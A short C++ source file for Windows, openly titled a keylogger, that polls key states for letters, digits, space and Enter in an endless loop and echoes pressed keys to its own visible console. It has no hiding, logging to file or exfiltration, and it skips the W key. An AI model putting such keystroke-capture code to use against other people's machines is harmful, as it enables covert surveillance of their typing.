#include <iostream>
#include <Windows.h>
#include <chrono>
#include <thread>
using namespace std;




void Keylogger(int delai) {
	while (true) {
		if (GetKeyState('A') & 0x8000) {
	 
			cout << "A";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('B') & 0x8000) {
	 
			cout << "B";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('C') & 0x8000) {
	 
			cout << "C";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}

		if (GetKeyState('D') & 0x8000) {
	 
			cout << "D";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('E') & 0x8000) {
	 
			cout << "E";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('F') & 0x8000) {
	 
			cout << "F";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('G') & 0x8000) {
	 
			cout << "G";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('H') & 0x8000) {
	 
			cout << "H";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('I') & 0x8000) {
	 
			cout << "I";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('J') & 0x8000) {
	 
			cout << "J";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('K') & 0x8000) {
	 
			cout << "K";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('L') & 0x8000) {
	 
			cout << "L";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('M') & 0x8000) {
	 
			cout << "M";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('N') & 0x8000) {
	 
			cout << "N";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('O') & 0x8000) {
	 
			cout << "O";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('P') & 0x8000) {
	 
			cout << "P";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Q') & 0x8000) {
	 
			cout << "Q";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('R') & 0x8000) {
	 
			cout << "R";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('S') & 0x8000) {
	 
			cout << "S";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('T') & 0x8000) {
	 
			cout << "T";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('U') & 0x8000) {
	 
			cout << "U";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('V') & 0x8000) {
	 
			cout << "V";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('X') & 0x8000) {
	 
			cout << "X";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Y') & 0x8000) {
	 
			cout << "Y";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState('Z') & 0x8000) {
	 
			cout << "Z";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_SPACE) & 0x8000) {
	 
			cout << " ";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(VK_RETURN) & 0x8000) {
	 
			cout << "\n";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x30) & 0x8000) {
	 
			cout << "0";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x31) & 0x8000) {
	 
			cout << "1";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x32) & 0x8000) {
	 
			cout << "2";
			this_thread::sleep_for(chrono::milliseconds(delai));

		}
		if (GetKeyState(0x33) & 0x8000) {
	 
			cout << "3";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x34) & 0x8000) {
	 
			cout << "4";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x35) & 0x8000) {

	 
			cout << "5";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x36) & 0x8000) {
	 
			cout << "6";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x37) & 0x8000) {
	 
			cout << "7";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x38) & 0x8000) {
	 
			cout << "8";
			this_thread::sleep_for(chrono::milliseconds(delai));
		}
		if (GetKeyState(0x39) & 0x8000) {
	 
			cout << "9";
			this_thread::sleep_for(chrono::milliseconds(delai));
			
		}

	}
}


int main()
{
	system("title Keylogger");
	Keylogger(100);
}
